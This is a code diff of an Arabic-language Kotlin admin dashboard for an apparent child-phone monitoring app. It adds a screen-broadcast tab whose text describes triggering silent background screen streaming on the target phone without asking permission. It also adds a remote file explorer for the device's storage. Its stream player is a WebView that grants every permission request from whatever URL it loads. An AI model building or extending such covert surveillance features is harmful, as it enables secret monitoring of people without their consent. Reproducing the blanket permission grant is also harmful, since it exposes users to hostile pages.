@@ -1061,7 +1061,8 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                             listOf(
                                 Triple(0, Icons.Default.Home, "الرئيسية"),
                                 Triple(1, Icons.Default.GridView, "الأوامر"),
-                                Triple(2, Icons.Default.Folder, "الملفات")
+                                Triple(2, Icons.Default.Tv, "البث"),
+                                Triple(3, Icons.Default.Folder, "الملفات")
                             ).forEach { (index, icon, label) ->
                                 val isSelected = bottomNavSelectedTab == index
                                 val contentColor = if (isSelected) Color(0xFF9155FF) else Color(0xFF9CA3AF)
@@ -1075,7 +1076,7 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                                         .background(backgroundColor)
                                         .clickable {
                                             bottomNavSelectedTab = index
-                                            if (index == 0) openCommandDetails = null
+                                            if (index == 0 || index == 2 || index == 3) openCommandDetails = null
                                         },
                                     contentAlignment = Alignment.Center
                                 ) {
@@ -1197,7 +1198,8 @@ fun AdminDashboard(viewModel: AdminViewModel) {
                     when (bottomNavSelectedTab) {
                         0 -> DeviceHomeTab(activeDevice, viewModel)
                         1 -> DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
-                        2 -> DeviceFilesExplorerTab(viewModel)
+                        2 -> LiveStreamRequirementsPage(viewModel)
+                        3 -> DeviceFilesExplorerTab(viewModel)
                     }
                 }
             }
@@ -3544,8 +3546,7 @@ fun CameraLiveTab(viewModel: AdminViewModel) {
                                 Text("في انتظار استجابة هاتف الطفل...", color = Color(0xFF6B7280), fontSize = 14.sp)
                             }
                         } else if (isStreamingActive) {
-                            val isWebRtcSignaling = !streamUrl.isNullOrBlank() && (streamUrl.contains("webrtc") || streamUrl.contains("signaling") || streamUrl.contains("render.com"))
-                            if (!streamUrl.isNullOrBlank() && !isWebRtcSignaling) {
+                            if (!streamUrl.isNullOrBlank()) {
                                 LiveStreamPlayer(
                                     streamUrl = streamUrl,
                                     deviceToken = viewModel.selectedDeviceToken.value,
@@ -3618,6 +3619,21 @@ fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
         verticalArrangement = Arrangement.spacedBy(12.dp)
     ) {
         Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFEFF6FF)),
+            border = BorderStroke(1.dp, Color(0xFFBFDBFE)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Row(modifier = Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
+                Icon(Icons.Default.Tv, contentDescription = null, tint = Color(0xFF3B82F6), modifier = Modifier.size(24.dp))
+                Spacer(modifier = Modifier.width(12.dp))
+                Column {
+                    Text("بث الشاشة المباشر (MediaCodec + WebSocket)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFF1E3A8A))
+                    Text("يرسل أمر stream_screen لتطبيق الطفل لبدء بث الشاشة فورياً بالخلفية وبصمت بدون طلب إذن من خلال تقنية الترميز والوب سوكيت.", fontSize = 11.sp, color = Color(0xFF1E40AF))
+                }
+            }
+        }
+
+        Card(
             colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
             border = BorderStroke(1.dp, if(isStreamingActive) Color(0xFF39D353) else if (isLoading) Color(0xFF9155FF) else Color(0xFFE5E7EB)),
             modifier = Modifier.fillMaxWidth()
@@ -3658,8 +3674,7 @@ fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
                             Text("في انتظار استجابة الطفل...", color = Color(0xFF6B7280), fontSize = 12.sp)
                         }
                     } else if (isStreamingActive) {
-                        val isWebRtcSignaling = !streamUrl.isNullOrBlank() && (streamUrl.contains("webrtc") || streamUrl.contains("signaling") || streamUrl.contains("render.com"))
-                        if (!streamUrl.isNullOrBlank() && !isWebRtcSignaling) {
+                        if (!streamUrl.isNullOrBlank()) {
                             LiveStreamPlayer(streamUrl = streamUrl, deviceToken = viewModel.selectedDeviceToken.value, modifier = Modifier.fillMaxSize())
                             IconButton(onClick = { showFullscreenStream = streamUrl }, modifier = Modifier.align(Alignment.BottomEnd).padding(4.dp).background(Color.Black.copy(alpha = 0.5f), CircleShape)) {
                                 Icon(Icons.Default.Fullscreen, null, tint = Color.White)
@@ -3704,12 +3719,7 @@ fun LiveStreamRequirementsPage(viewModel: AdminViewModel) {
     showFullscreenStream?.let { url ->
         Dialog(onDismissRequest = { showFullscreenStream = null }) {
             Box(modifier = Modifier.fillMaxSize().clickable { showFullscreenStream = null }.background(Color.Black), contentAlignment = Alignment.Center) {
-                val isWebRtcSignaling = !url.isNullOrBlank() && (url.contains("webrtc") || url.contains("signaling") || url.contains("render.com"))
-                if (!isWebRtcSignaling) {
-                    LiveStreamPlayer(streamUrl = url, deviceToken = viewModel.selectedDeviceToken.value, modifier = Modifier.fillMaxSize())
-                } else {
-                    Text("لا يمكن عرض البث عبر بروتوكول الإشارة", color = Color.White)
-                }
+                LiveStreamPlayer(streamUrl = url, deviceToken = viewModel.selectedDeviceToken.value, modifier = Modifier.fillMaxSize())
             }
         }
     }
@@ -5621,68 +5631,120 @@ fun LiveStreamPlayer(
     modifier: Modifier = Modifier
 ) {
     val context = androidx.compose.ui.platform.LocalContext.current
+    val isWebSocketMediaCodec = !streamUrl.isNullOrBlank() && 
+            (streamUrl.startsWith("http://", ignoreCase = true) || 
+             streamUrl.startsWith("https://", ignoreCase = true) || 
+             streamUrl.contains("webrtc", ignoreCase = true) || 
+             streamUrl.contains("signaling", ignoreCase = true) || 
+             streamUrl.contains("mediacodec", ignoreCase = true) || 
+             streamUrl.contains("websocket", ignoreCase = true) || 
+             streamUrl.contains("render.com", ignoreCase = true))
 
     Box(modifier = modifier) {
-        val exoPlayer = remember(streamUrl) {
-            val loadControl = androidx.media3.exoplayer.DefaultLoadControl.Builder()
-                .setBufferDurationsMs(500, 2000, 500, 500)
-                .build()
-            
-            ExoPlayer.Builder(context)
-                .setLoadControl(loadControl)
-                .build().apply {
-                val mediaItem = Media3MediaItem.fromUri(streamUrl)
-                if (streamUrl.startsWith("rtsp://", ignoreCase = true)) {
-                    val mediaSource = RtspMediaSource.Factory()
-                        .setForceUseRtpTcp(true)
-                        .setTimeoutMs(3000)
-                        .createMediaSource(mediaItem)
-                    setMediaSource(mediaSource)
-                } else {
-                    setMediaItem(mediaItem)
-                }
-                playWhenReady = true
-                prepare()
-            }
-        }
+        if (isWebSocketMediaCodec) {
+            AndroidView(
+                factory = { ctx ->
+                    android.webkit.WebView(ctx).apply {
+                        settings.javaScriptEnabled = true
+                        settings.domStorageEnabled = true
+                        settings.mediaPlaybackRequiresUserGesture = false
+                        settings.useWideViewPort = true
+                        settings.loadWithOverviewMode = true
+                        webViewClient = android.webkit.WebViewClient()
+                        webChromeClient = object : android.webkit.WebChromeClient() {
+                            override fun onPermissionRequest(request: android.webkit.PermissionRequest?) {
+                                request?.grant(request.resources)
+                            }
+                        }
+                        loadUrl(streamUrl)
+                    }
+                },
+                modifier = Modifier.fillMaxSize()
+            )
 
-        DisposableEffect(exoPlayer) {
-            onDispose {
-                exoPlayer.release()
-            }
-        }
-
-        AndroidView(
-            factory = { ctx ->
-                PlayerView(ctx).apply {
-                    player = exoPlayer
-                    useController = false
-                    resizeMode = androidx.media3.ui.AspectRatioFrameLayout.RESIZE_MODE_FIT
-                }
-            },
-            modifier = Modifier.fillMaxSize()
-        )
-
-        Row(
-            modifier = Modifier
-                .align(androidx.compose.ui.Alignment.TopEnd)
-                .padding(8.dp)
-                .background(Color.Black.copy(alpha = 0.7f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
-                .padding(horizontal = 10.dp, vertical = 6.dp),
-            verticalAlignment = Alignment.CenterVertically
-        ) {
-            Box(
+            Row(
                 modifier = Modifier
-                    .size(8.dp)
-                    .background(Color(0xFF39D353), androidx.compose.foundation.shape.CircleShape)
+                    .align(androidx.compose.ui.Alignment.TopEnd)
+                    .padding(8.dp)
+                    .background(Color.Black.copy(alpha = 0.7f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
+                    .padding(horizontal = 10.dp, vertical = 6.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(8.dp)
+                        .background(Color(0xFF3B82F6), androidx.compose.foundation.shape.CircleShape)
+                )
+                Spacer(Modifier.width(6.dp))
+                Text(
+                    text = "بث (MediaCodec + WebSocket) مباشر ومضغوط 📡",
+                    color = Color.White,
+                    fontSize = 11.sp,
+                    fontWeight = FontWeight.Bold
+                )
+            }
+        } else {
+            val exoPlayer = remember(streamUrl) {
+                val loadControl = androidx.media3.exoplayer.DefaultLoadControl.Builder()
+                    .setBufferDurationsMs(500, 2000, 500, 500)
+                    .build()
+                
+                ExoPlayer.Builder(context)
+                    .setLoadControl(loadControl)
+                    .build().apply {
+                    val mediaItem = Media3MediaItem.fromUri(streamUrl)
+                    if (streamUrl.startsWith("rtsp://", ignoreCase = true)) {
+                        val mediaSource = RtspMediaSource.Factory()
+                            .setForceUseRtpTcp(true)
+                            .setTimeoutMs(3000)
+                            .createMediaSource(mediaItem)
+                        setMediaSource(mediaSource)
+                    } else {
+                        setMediaItem(mediaItem)
+                    }
+                    playWhenReady = true
+                    prepare()
+                }
+            }
+
+            DisposableEffect(exoPlayer) {
+                onDispose {
+                    exoPlayer.release()
+                }
+            }
+
+            AndroidView(
+                factory = { ctx ->
+                    PlayerView(ctx).apply {
+                        player = exoPlayer
+                        useController = false
+                        resizeMode = androidx.media3.ui.AspectRatioFrameLayout.RESIZE_MODE_FIT
+                    }
+                },
+                modifier = Modifier.fillMaxSize()
             )
-            Spacer(Modifier.width(6.dp))
-            Text(
-                text = "بث مشغل الفيديو الآمن الفوري",
-                color = Color.White,
-                fontSize = 11.sp,
-                fontWeight = FontWeight.Bold
-            )
+
+            Row(
+                modifier = Modifier
+                    .align(androidx.compose.ui.Alignment.TopEnd)
+                    .padding(8.dp)
+                    .background(Color.Black.copy(alpha = 0.7f), androidx.compose.foundation.shape.RoundedCornerShape(8.dp))
+                    .padding(horizontal = 10.dp, vertical = 6.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(8.dp)
+                        .background(Color(0xFF39D353), androidx.compose.foundation.shape.CircleShape)
+                )
+                Spacer(Modifier.width(6.dp))
+                Text(
+                    text = "بث مشغل الفيديو الآمن (RTSP/RTMP)",
+                    color = Color.White,
+                    fontSize = 11.sp,
+                    fontWeight = FontWeight.Bold
+                )
+            }
         }
     }
 }
@@ -6123,11 +6185,16 @@ fun DeviceFilesExplorerTab(viewModel: AdminViewModel) {
                         color = Color(0xFF111827),
                         modifier = Modifier.weight(1f)
                     )
-                    IconButton(
-                        onClick = { viewModel.requestDirectoryScan("/storage/emulated/0") },
-                        modifier = Modifier.size(36.dp).background(Color(0xFFEFF6FF), CircleShape)
+                    Button(
+                        onClick = { viewModel.requestDirectoryScan(currentPath) },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
+                        shape = RoundedCornerShape(8.dp),
+                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
+                        modifier = Modifier.height(36.dp)
                     ) {
-                        Icon(Icons.Default.Refresh, contentDescription = "تحديث الخريطة", tint = Color(0xFF3B82F6), modifier = Modifier.size(20.dp))
+                        Icon(Icons.Default.Refresh, contentDescription = null, tint = Color.White, modifier = Modifier.size(16.dp))
+                        Spacer(modifier = Modifier.width(4.dp))
+                        Text("جلب الملفات", color = Color.White, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                     }
                 }
                 Spacer(modifier = Modifier.height(12.dp))
@@ -6142,35 +6209,48 @@ fun DeviceFilesExplorerTab(viewModel: AdminViewModel) {
             }
         }
 
-        // Content
-        if (isLoading) {
-            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
-                Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                    CircularProgressIndicator(color = Color(0xFF9155FF))
-                    Spacer(modifier = Modifier.height(12.dp))
-                    Text("جاري استكشاف المجلد...", color = Color.Gray, fontSize = 14.sp)
+        // Content wrapped in SwipeToRefreshBox
+        SwipeToRefreshBox(
+            isRefreshing = isLoading,
+            onRefresh = { viewModel.loadDeviceFileMap() },
+            modifier = Modifier.weight(1f).fillMaxWidth()
+        ) {
+            if (isLoading && files.isEmpty()) {
+                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                        CircularProgressIndicator(color = Color(0xFF9155FF))
+                        Spacer(modifier = Modifier.height(12.dp))
+                        Text("جاري استكشاف المجلد...", color = Color.Gray, fontSize = 14.sp)
+                    }
                 }
-            }
-        } else if (files.isEmpty()) {
-            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
-                Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                    Icon(Icons.Default.HourglassEmpty, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(64.dp))
-                    Spacer(modifier = Modifier.height(16.dp))
-                    Text("المجلد فارغ", color = Color.Gray, fontSize = 16.sp)
+            } else if (files.isEmpty()) {
+                Box(
+                    modifier = Modifier
+                        .fillMaxSize()
+                        .verticalScroll(rememberScrollState()),
+                    contentAlignment = Alignment.Center
+                ) {
+                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                        Icon(Icons.Default.HourglassEmpty, contentDescription = null, tint = Color.LightGray, modifier = Modifier.size(64.dp))
+                        Spacer(modifier = Modifier.height(16.dp))
+                        Text("المجلد فارغ أو لم يتم جلبه بعد", color = Color.Gray, fontSize = 16.sp)
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Text("اسحب للأسفل للتحديث أو اضغط على جلب الملفات", color = Color.LightGray, fontSize = 12.sp)
+                    }
                 }
-            }
-        } else {
-            LazyColumn(
-                modifier = Modifier.fillMaxSize().padding(16.dp),
-                verticalArrangement = Arrangement.spacedBy(8.dp)
-            ) {
-                items(files) { file ->
-                    FileExplorerItem(file = file) { clickedFile ->
-                        if (clickedFile.is_directory) {
-                            val nextPath = if (currentPath == "/") "/${clickedFile.file_name}" else "$currentPath/${clickedFile.file_name}"
-                            viewModel.exploreDirectory(nextPath)
-                        } else {
-                            // Can show some actions here in future
+            } else {
+                LazyColumn(
+                    modifier = Modifier.fillMaxSize().padding(16.dp),
+                    verticalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    items(files) { file ->
+                        FileExplorerItem(file = file) { clickedFile ->
+                            if (clickedFile.is_directory) {
+                                val nextPath = if (currentPath == "/") "/${clickedFile.file_name}" else "$currentPath/${clickedFile.file_name}"
+                                viewModel.exploreDirectory(nextPath)
+                            } else {
+                                // Can show some actions here in future
+                            }
                         }
                     }
                 }
